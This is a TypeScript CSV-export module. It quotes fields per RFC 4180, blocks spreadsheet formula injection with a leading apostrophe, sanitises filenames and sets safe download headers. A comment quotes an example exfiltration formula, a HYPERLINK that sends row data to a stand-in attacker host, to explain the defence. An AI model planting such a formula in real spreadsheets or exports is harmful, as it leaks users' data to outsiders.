/**
 * CSV writing.
 *
 * Two separate problems, and only one of them is about commas.
 *
 * 1. RFC 4180 quoting. A field containing a comma, a quote or a newline has
 *    to be wrapped and its quotes doubled, or the row silently gains columns.
 *    A guard's note reading `Suspicious activity, north gate` would otherwise
 *    split into two cells and shift every later column by one.
 *
 * 2. Formula injection, which is the one that matters. Excel, Numbers and
 *    Google Sheets all evaluate a cell whose first character is `=`, `+`, `-`
 *    or `@`. An entry typed as `=HYPERLINK("https://evil.test?d="&A1,"ok")`
 *    becomes a live link in the manager's spreadsheet pointing at whatever
 *    else is in that row. The text arrives from a guard's dictation or
 *    keyboard and travels to a client's laptop, so this export is exactly the
 *    boundary where it has to be neutralised.
 *
 * The fix is a leading apostrophe, which every spreadsheet reads as "this is
 * text" and strips on display. It is applied here, at the single point where
 * data becomes a file, rather than on input — because the same text has to
 * stay intact in the PDF, in the app and in the JSON export, where it is not
 * a formula and never was.
 */

const RISKY_FIRST = new Set(["=", "+", "-", "@", "\t", "\r"]);

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text =
    value instanceof Date
      ? value.toISOString()
      : typeof value === "string"
        ? value
        : String(value);

  if (text.length > 0 && RISKY_FIRST.has(text[0]!)) {
    text = `'${text}`;
  }

  if (/[",\n\r]/.test(text)) {
    return `"${text.replaceAll('"', '""')}"`;
  }
  return text;
}

export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvCell).join(",");
}

/**
 * Builds a whole document.
 *
 * CRLF line endings, per RFC 4180. Excel on Windows renders a bare LF file as
 * one long line, and "the export is broken" is indistinguishable from "the
 * export is empty" to whoever opened it.
 */
export function csvDocument(
  header: readonly string[],
  rows: readonly (readonly unknown[])[],
): string {
  return [csvRow(header), ...rows.map(csvRow)].join("\r\n") + "\r\n";
}

/**
 * A filename that survives the trip.
 *
 * `Content-Disposition` is parsed by the browser, so a quote or a newline in
 * the name can end the header early. Restricting to a known-safe alphabet is
 * shorter than encoding and leaves a name a person can still read.
 */
export function csvFilename(stem: string, at = new Date()): string {
  const safe = stem.replace(/[^A-Za-z0-9._-]+/g, "-").slice(0, 60);
  const day = at.toISOString().slice(0, 10);
  return `${safe}-${day}.csv`;
}

/**
 * The headers a CSV download needs.
 *
 * `text/csv` alone is not enough: without `Content-Disposition: attachment`
 * some browsers render the file inline, and a reflected-text response served
 * from our own origin is a place scripts can sometimes be coaxed to run.
 * `nosniff` closes the same door from the other side.
 */
export function csvResponseHeaders(filename: string): HeadersInit {
  return {
    "Content-Type": "text/csv; charset=utf-8",
    "Content-Disposition": `attachment; filename="${filename}"`,
    "X-Content-Type-Options": "nosniff",
    "Cache-Control": "private, no-store",
  };
}
